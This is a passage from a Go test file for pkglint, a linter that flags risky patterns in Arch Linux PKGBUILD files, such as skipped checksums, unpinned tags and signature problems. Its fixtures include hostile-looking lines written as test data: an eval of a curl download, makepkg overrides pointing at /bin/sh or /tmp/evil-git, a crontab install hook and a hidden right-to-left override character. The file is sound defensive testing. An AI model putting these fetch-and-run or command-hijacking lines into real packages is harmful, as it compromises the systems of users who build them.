package rules

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/jmelahman/pkglint/internal/pkgbuild"
)

// lint writes the given files into a temp package dir and runs every rule.
func lint(t *testing.T, files map[string]string) []Finding {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return Run(pkg, nil)
}

func ruleIDs(fs []Finding) map[string]int {
	out := map[string]int{}
	for _, f := range fs {
		out[f.RuleID]++
	}
	return out
}

const cleanPKGBUILD = `# Maintainer: Sam Coder <sam@example.com>
pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc='A demonstration tool'
arch=('x86_64')
url='https://github.com/example/demo'
license=('MIT')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/demo/archive/v$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')

build() {
  cd "$pkgname-$pkgver"
  make
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
`

func TestCleanPKGBUILDHasNoFindings(t *testing.T) {
	findings := lint(t, map[string]string{"PKGBUILD": cleanPKGBUILD})
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %+v", findings)
	}
}

func TestRegistryIsWellFormed(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range Registry() {
		if seen[r.ID] {
			t.Errorf("duplicate rule ID %s", r.ID)
		}
		seen[r.ID] = true
		if r.Name == "" || r.Doc == "" || r.Check == nil {
			t.Errorf("rule %s is missing name, doc, or check", r.ID)
		}
		if r.Bad == "" || r.Good == "" {
			t.Errorf("rule %s is missing a Bad/Good example", r.ID)
		}
		// MaxSeverity is only meaningful above Severity: Severities() reads
		// anything at or below it as "unset", so a MaxSeverity that does not
		// escalate is silently ignored rather than wrong on the page.
		if r.MaxSeverity != 0 && r.MaxSeverity <= r.Severity {
			t.Errorf("rule %s sets MaxSeverity %s at or below Severity %s; drop it or raise it",
				r.ID, r.MaxSeverity, r.Severity)
		}
	}
}

// TestRuleSeveritiesAreDeclared keeps Rule.Severity and Rule.MaxSeverity in
// step with the checks. They are hand-written declarations about code that
// picks a severity per finding, so nothing but a test stops them drifting when
// a check grows a branch — and the rule reference publishes them as fact.
//
// Every finding a rule's own examples produce must land inside that rule's
// declared range. Examples cover the branch each was written for; the rules
// that escalate are pinned at both ends by TestEscalatingRulesReachBothEnds.
func TestRuleSeveritiesAreDeclared(t *testing.T) {
	index := map[string]Rule{}
	for _, r := range Registry() {
		index[r.ID] = r
	}
	within := func(t *testing.T, findings []Finding) {
		t.Helper()
		for _, f := range findings {
			r, ok := index[f.RuleID]
			if !ok {
				t.Errorf("finding for unregistered rule %s", f.RuleID)
				continue
			}
			if s := r.Severities(); f.Severity < s.Low || f.Severity > s.High {
				t.Errorf("%s reported %s, outside its declared %s..%s: %s",
					f.RuleID, f.Severity, s.Low, s.High, f.Message)
			}
		}
	}
	for _, r := range Registry() {
		t.Run(r.ID, func(t *testing.T) {
			within(t, lint(t, packageFor(r.ID, "bad", r.Bad)))
			within(t, lint(t, packageFor(r.ID, "good", r.Good)))
		})
	}
}

// TestFindingJSONRoundTrip pins that a Finding survives being written and read
// back. Severity encodes as a name rather than the int it is, so the two halves
// have to agree; when only the marshaler existed, anything that persisted
// findings as JSON wrote a file it could not load.
func TestFindingJSONRoundTrip(t *testing.T) {
	for _, sev := range []Severity{Info, Warn, Error, Critical} {
		t.Run(sev.String(), func(t *testing.T) {
			want := Finding{
				RuleID: "PB101", Severity: sev, Message: "a message",
				Path: "PKGBUILD", Line: 3, Col: 7,
			}
			b, err := json.Marshal(want)
			if err != nil {
				t.Fatal(err)
			}
			var got Finding
			if err := json.Unmarshal(b, &got); err != nil {
				t.Fatalf("unmarshal %s: %v", b, err)
			}
			if got != want {
				t.Errorf("round trip changed the finding:\n got %+v\nwant %+v", got, want)
			}
		})
	}
	t.Run("unknown name", func(t *testing.T) {
		var f Finding
		if err := json.Unmarshal([]byte(`{"severity":"catastrophic"}`), &f); err == nil {
			t.Error("expected an error for an unknown severity, got nil")
		}
	})
}

// The renderer marks anything it cannot resolve with a NUL, which rules test
// for internally. That sentinel must not survive into a message: a terminal, a
// JSON report and a SARIF file all render it as garbage, and %q turns it into a
// literal \x00 that reads like the PKGBUILD contains a corrupt filename.
func TestFindingMessagesCarryNoSentinel(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": pkgbuildWith("", strings.Join([]string{
			`source=("http://example.com/${pkgver%%.*}/f.tar.gz")`,
			`sha256sums=('SKIP')`,
			`package() {`,
			`  install -Dm644 f.txt "/etc/$(id -un)/f.conf"`,
			`}`,
		}, "\n")),
	}
	var checked int
	for _, f := range lint(t, files) {
		if strings.ContainsAny(f.Message, "\x00") || strings.Contains(f.Message, `\x00`) {
			t.Errorf("[%s] message leaks the unresolvable sentinel: %q", f.RuleID, f.Message)
		}
		if strings.Contains(f.Message, "…") {
			checked++
		}
	}
	// Guards against the fixture quietly ceasing to produce an unresolvable
	// word, which would leave the assertion above passing vacuously.
	if checked == 0 {
		t.Error("no finding quoted an unresolvable expansion; the fixture no longer exercises the sanitizer")
	}
}

// TestEscalatingRulesReachBothEnds pins the rules that report more than one
// severity. Containment alone cannot catch a range that is too wide: a rule
// declared warn..critical that in fact only ever reports warn passes every
// other check here while overstating itself on the rule reference. So each
// entry below drives the rule to both ends of what it declares, and the list
// must name every rule whose range varies — a new escalation gets a fixture,
// not a free pass.
func TestEscalatingRulesReachBothEnds(t *testing.T) {
	// low and high are packages that should drive the rule to the bottom and
	// the top of its declared range.
	cases := map[string]struct{ low, high map[string]string }{
		"PB108": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "PACKAGER='Someone <a@b.c>'")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "VCSCLIENTS=('git::/bin/sh')")},
		},
		"PB104": {
			low: map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('http://example.com/demo.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")},
			high: map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('http://example.com/demo.tar.gz')
sha256sums=('SKIP')`, "")},
		},
		"PB208": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  bundle install\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  gem install rails\n}")},
		},
		"PB302": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"echo hi\"\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  eval \"$(curl -s https://example.com/x)\"\n}")},
		},
		"PB306": {
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  $(printf make) all\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ${!runner} all\n}")},
		},
		"PB309": {
			// U+200B ZERO WIDTH SPACE, then U+202E RIGHT-TO-LEFT OVERRIDE.
			low:  map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make​ all\n}")},
			high: map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make‮ all\n}")},
		},
		"PB502": {
			low: map[string]string{
				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
				"demo.install": "post_install() {\n  systemctl enable demo.service\n}\n",
			},
			high: map[string]string{
				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
				"demo.install": "post_install() {\n  crontab /usr/share/demo/cron\n}\n",
			},
		},
	}

	for _, r := range Registry() {
		s := r.Severities()
		_, pinnedHere := cases[r.ID]
		// Package-scope rules are driven through archive fixtures in
		// TestPackageEscalatingRulesReachBothEnds instead.
		pinned := pinnedHere || packageEscalationCases[r.ID]
		if s.Varies() != pinned {
			t.Errorf("%s declares %s..%s but %s in TestEscalatingRulesReachBothEnds",
				r.ID, s.Low, s.High, map[bool]string{true: "is pinned", false: "is not pinned"}[pinned])
		}
	}

	// reports asserts the rule fires on files and that want is among the
	// severities it reports there.
	reports := func(t *testing.T, id string, files map[string]string, want Severity) {
		t.Helper()
		var got []Severity
		for _, f := range lint(t, files) {
			if f.RuleID == id {
				got = append(got, f.Severity)
				if f.Severity == want {
					return
				}
			}
		}
		t.Errorf("%s: want a %s finding, got %v", id, want, got)
	}
	for id, tc := range cases {
		r, ok := RuleByID(id)
		if !ok {
			t.Errorf("unknown rule %s", id)
			continue
		}
		t.Run(id, func(t *testing.T) {
			s := r.Severities()
			reports(t, id, tc.low, s.Low)
			reports(t, id, tc.high, s.High)
		})
	}
}

// expectRule asserts that linting files yields at least one finding for id.
func expectRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] == 0 {
		t.Errorf("expected %s, got %v", id, ids)
	}
}

// expectNoRule asserts that linting files yields no finding for id.
func expectNoRule(t *testing.T, id string, files map[string]string) {
	t.Helper()
	ids := ruleIDs(lint(t, files))
	if ids[id] != 0 {
		t.Errorf("expected no %s, got %v", id, ids)
	}
}

func pkgbuildWith(header, body string) string {
	if header == "" {
		header = `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com/demo'
license=('MIT')
source=("https://example.com/demo-$pkgver.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`
	}
	return header + "\n" + body + "\n"
}

func TestIntegrityRules(t *testing.T) {
	t.Run("PB101 skipped checksum on remote tarball", func(t *testing.T) {
		expectRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB101 not for VCS sources", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=abc123")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB102 md5-only digests", func(t *testing.T) {
		expectRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')`, "")})
	})
	t.Run("PB102 not when sha256 also present", func(t *testing.T) {
		expectNoRule(t, "PB102", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo.tar.gz")
md5sums=('0123456789abcdef0123456789abcdef')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB103 mutable tag pin", func(t *testing.T) {
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 not for a -git package following a branch", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git")
sha256sums=('SKIP')`, "")})
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#branch=main")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git exemption reads through pkgbase and variables", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`_pkgname=demo
pkgbase=$_pkgname-git
pkgname=($_pkgname-git $_pkgname-docs)
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git package pinned to a mutable tag is still flagged", func(t *testing.T) {
		// The suffix licenses following upstream's tip, not a re-pointable tag.
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 -git does not exempt a source from another VCS", func(t *testing.T) {
		expectRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo-git
pkgver=1
pkgrel=1
url='https://example.com'
source=("svn+https://example.com/demo/trunk")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB103 commit pin is fine", func(t *testing.T) {
		expectNoRule(t, "PB103", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB104 plain http source", func(t *testing.T) {
		expectRule(t, "PB104", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("http://example.com/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 source host differs from url host", func(t *testing.T) {
		expectRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://project.example.com'
source=("https://cdn.sketchy.io/demo.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB105 github raw content allowed", func(t *testing.T) {
		expectNoRule(t, "PB105", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/example/demo'
source=("https://raw.githubusercontent.com/example/demo/main/x.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB106 DLAGENTS override", func(t *testing.T) {
		expectRule(t, "PB106", map[string]string{"PKGBUILD": pkgbuildWith("",
			`DLAGENTS=('https::/usr/bin/curl -o %o %u')`)})
	})
	t.Run("PB107 missing install script", func(t *testing.T) {
		expectRule(t, "PB107", map[string]string{"PKGBUILD": pkgbuildWith("", `install=demo.install`)})
	})
	t.Run("PB108 command-executing makepkg.conf override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`VCSCLIENTS=('git::/tmp/evil-git')`)})
	})
	t.Run("PB108 trust-affecting override", func(t *testing.T) {
		expectRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`PACKAGER='Trusted Maintainer <root@example.com>'`)})
	})
	t.Run("PB108 leaves ordinary build vars alone", func(t *testing.T) {
		expectNoRule(t, "PB108", map[string]string{"PKGBUILD": pkgbuildWith("",
			`MAKEFLAGS="-j$(nproc)"`)})
	})
	t.Run("PB109 same forge, different owner", func(t *testing.T) {
		expectRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/somebodyelse/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB109 same forge and owner is fine", func(t *testing.T) {
		expectNoRule(t, "PB109", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://github.com/upstream/demo'
source=("git+https://github.com/upstream/demo.git#commit=0123abc")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB110 checksum count mismatch", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 matched counts are fine", func(t *testing.T) {
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith("", "")})
	})
	t.Run("PB110 counts through an array-reference source", func(t *testing.T) {
		// The ttf-ms-fonts shape: one written element, three real sources.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
_files=('a.bin' 'b.bin' 'c.bin')
_dlpath='https://example.com/pub'
source=("${_files[@]/#/$_dlpath/}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 mismatch through an array-reference source", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
_files=('a.bin' 'b.bin' 'c.bin')
_dlpath='https://example.com/pub'
source=("${_files[@]/#/$_dlpath/}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 counts brace-expanded checksums", func(t *testing.T) {
		// The shadps4-git shape: one written sums element covering every VCS
		// source. `SKIP{,,,}` is four checksums to makepkg, not one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,,,})`, "")})
	})
	t.Run("PB110 brace-expanded checksums still short is flagged", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,})`, "")})
	})
	t.Run("PB114 brace-expanded SKIP is not a malformed digest", func(t *testing.T) {
		expectNoRule(t, "PB114", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/a.git" "git+https://example.com/b.git"
        "git+https://example.com/c.git" "git+https://example.com/d.git")
sha256sums=(SKIP{,,,})`, "")})
	})
	t.Run("PB114 brace expansion still catches a short digest", func(t *testing.T) {
		expectRule(t, "PB114", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=(dead{beef,f00d})`, "")})
	})
	t.Run("PB110 skips a source array it cannot size", func(t *testing.T) {
		// _files is only built inside prepare(), so the top-level reference has
		// no statically known length; a mismatch claim would be a guess.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("${_files[@]}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 skips arrays a top-level conditional extends", func(t *testing.T) {
		// makepkg runs the `if` before it reads the metadata, so the arrays it
		// sees are three long; only the unconditional halves are visible here.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
if [ "$CARCH" = 'x86_64' ]; then
  source+=('https://example.com/c.tar.gz')
  sha256sums+=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
fi`, "")})
	})
	t.Run("PB110 still counts when only a function assigns", func(t *testing.T) {
		// A function body runs long after makepkg has read the metadata, so it
		// cannot be the reason the counts disagree.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
prepare() {
  source+=('https://example.com/c.tar.gz')
}`)})
	})
	t.Run("PB110 empty sums array beside a covering one is fine", func(t *testing.T) {
		// An empty array retires an algorithm; makepkg only needs one that
		// matches, and only raises "differ in size" for a non-empty one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz')
md5sums=()
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 empty sums array with nothing covering is flagged", func(t *testing.T) {
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('git+https://example.com/demo.git#tag=v1')
sha256sums=()`, "")})
	})
	t.Run("PB110 skips an array built by an unquoted command substitution", func(t *testing.T) {
		// bash word-splits what _urls() prints, so that one written element is
		// however many sources the function emits — three here, not one.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=($(_urls))
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
_urls() {
  echo https://example.com/a.tar.gz
  echo https://example.com/b.tar.gz
  echo https://example.com/c.tar.gz
}`)})
	})
	t.Run("PB110 still counts a quoted command substitution", func(t *testing.T) {
		// In quotes it cannot split, so it really is the one source it looks like.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("$(_url)")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 skips an array holding an unquoted glob", func(t *testing.T) {
		// bash expands *.md against the build directory, so how many sources
		// that element is depends on what is sitting next to the PKGBUILD.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' *.md)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 still counts an unquoted URL with a query string", func(t *testing.T) {
		// bash leaves an unmatched glob literal, and a URL can never match a
		// pathname, so the `?` here is a query string and the count holds.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=(https://example.com/download.php?file=demo.tar.gz)
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 still counts a quoted asterisk", func(t *testing.T) {
		// Quoted it is a literal filename, however odd, and pairs one-to-one.
		expectRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=('https://example.com/a.tar.gz' '*.md')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})
	t.Run("PB110 counts a source naming a brace-expanded pkgname", func(t *testing.T) {
		// "$pkgname" is "${pkgname[0]}", and bash brace-expands the assignment
		// before indexing it: element zero is "demo", not "demo{,-extra}".
		// Splicing the written form would leave braces for a later pass to
		// re-expand, turning this one source into two.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgbase=demo
pkgname=(demo{,-extra})
pkgver=1
pkgrel=1
url='https://example.com'
source=("$pkgname-$pkgver-LICENSE.txt::https://example.com/LICENSE")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, `
package_demo() { :; }
package_demo-extra() { :; }`)})
	})
	t.Run("PB110 skips an array a top-level conditional assigns as a scalar", func(t *testing.T) {
		// `source="x"` then `source+=(a b c)` is four elements to bash: the
		// append folds the scalar in as element zero.
		expectNoRule(t, "PB110", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
if [ -n "$SOMETHING" ]; then
  source='https://example.com/a.tar.gz'
else
  source='https://example.com/b.tar.gz'
fi
source+=('local.conf' 'other.conf')
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')`, "")})
	})

	sigNoKeys := `pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz"
        "https://example.com/demo-1.tar.gz.sig")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')`
	sigWithKeys := sigNoKeys + `
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`

	t.Run("PB111 signature without validpgpkeys", func(t *testing.T) {
		expectRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(sigNoKeys, "")})
	})
	t.Run("PB111 not when keys are pinned", func(t *testing.T) {
		expectNoRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB111 signed VCS source without keys", func(t *testing.T) {
		expectRule(t, "PB111", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("git+https://example.com/demo.git?signed#tag=v1")
sha256sums=('SKIP')`, "")})
	})
	t.Run("PB101 not for the signature file or its signed artifact", func(t *testing.T) {
		expectNoRule(t, "PB101", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB112 signature over http", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz"
        "http://example.com/demo-1.tar.gz.sig")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")}
		expectRule(t, "PB112", files)
		expectNoRule(t, "PB104", files) // PB112 owns signature transport
	})
	t.Run("PB112 not for https signature", func(t *testing.T) {
		expectNoRule(t, "PB112", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB113 keys pinned but nothing signed", func(t *testing.T) {
		expectRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")})
	})
	t.Run("PB113 not when a signature source exists", func(t *testing.T) {
		expectNoRule(t, "PB113", map[string]string{"PKGBUILD": pkgbuildWith(sigWithKeys, "")})
	})
	t.Run("PB113 not for a brace-expanded signature pair", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=demo
pkgver=1
pkgrel=1
url='https://example.com'
source=("https://example.com/demo-1.tar.gz{,.sig}")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef' 'SKIP')
validpgpkeys=('ABAF11C65A2970B130ABE3C479BE3E4300411886')`, "")}
		expectNoRule(t, "PB113", files)
